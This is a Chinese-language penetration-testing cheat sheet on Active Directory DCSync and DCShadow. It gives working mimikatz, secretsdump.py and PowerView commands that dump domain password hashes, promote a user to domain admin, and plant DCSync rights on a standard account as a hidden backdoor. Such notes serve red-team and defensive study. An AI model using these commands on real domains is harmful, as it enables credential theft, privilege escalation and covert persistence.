# DCSync

#### 关于DCSync

**DCSync**

* 域内可以拥有多个域控制器，每台域控各自存储一份所在域的活动目录可写副本，对目录任何修改都可以从源域控制器同步到本域、域树或域林中的其他域控制器上
* 一个域向另外一个获取数据更新时，客户端域控会向服务端域控发送DSGetNCChanges请求，请求保护客户端域控必须应用到其活动目录副本的一组更新
* 域控制器15分钟就会有一次域数据同步
* DSCync通过域控制器同步原理，通过Directory Replication Services(DRS)服务的IDL\_DRSGetNCChanges接口向域控发起数据同步请求
* 在DCSync出现前需要测试人员登录到域控制器或卷影拷贝获取NTDS.dit文件
* 利用DCSync，测试人员可以在域内任何一台机器上模拟一个域控制器
* DCSync不适用于RODC(只读控制器)
* 默认情况下，只有Administrator、Domain Controllers和Enterprise Domain Admins组内用户和DC的机械账户才有执行DCSync操作的权限

#### DCSync导域内哈希

mimikatz用法，导出域内指定用户的信息(包括hash)

```
mimikatz.exe "lsadump::dcsync /domain:hack-my.com /user:hack-my\administrator" exit
```

mimikatz用法，导出域内所有用户的信息(包括hash)

```
mimikatz.exe "lsadump::dcsync /domain:hack-my.com /all /csv" exit
```

impacket项目secretsdump.py利用

```

python3 secretsdump.py hack-my.com/administrator:P\@ssW0rd\!@10.10.10.11 -just-dc-user "hack-my\administrator"
```

#### DCShadow

* 利用DRS数据同步机制，将DCSync攻击思路反转，通过创建恶意域控，利用DRS将预先设定的对象和对象属性注入正在允许的合法域控制器。
* 利用DCShadow修改普通域用户的primaryGroupID属性改为512，使普通用户成为域管理员

在域内任意主机上利用mimikatz进行数据更改

```
mimikatz.exe "lsadump::dcshadow /object:CN=lbwnb,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512" exit
```

保持第一个窗口的mimikatz不关闭新开一个cmd窗口，运行mimikatz强制触发域复制

```
mimikatz.exe "lsadump::dcshadow /push" exit
```

#### DCSync权限维持

* 在获得域管后，测试人员可以手动为域内标准用户赋予DCSync权限实现隐藏后门，只需要为普通域用户添加两条扩展权限即可
* DS-Replication-Get-Changes 复制目录更改 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
* DS-Replication-Get-Changes-All 复制所有目录更改 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

powerview.ps1脚本实现lbwnb用户的权限添加，添加后可以使用lbwnb用户导域内hash

```
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=hack-my,DC=com" -PrincipalIdent lbwnb -Rights DCSync -Verbose
```

删除权限

```
Import-Module .\PowerView.ps1
Remove-DomainObjectAcl -TargetIdentity "DC=hack-my,DC=com" -PrincipalIdent lbwnb -Rights DCSync -Verbose
```
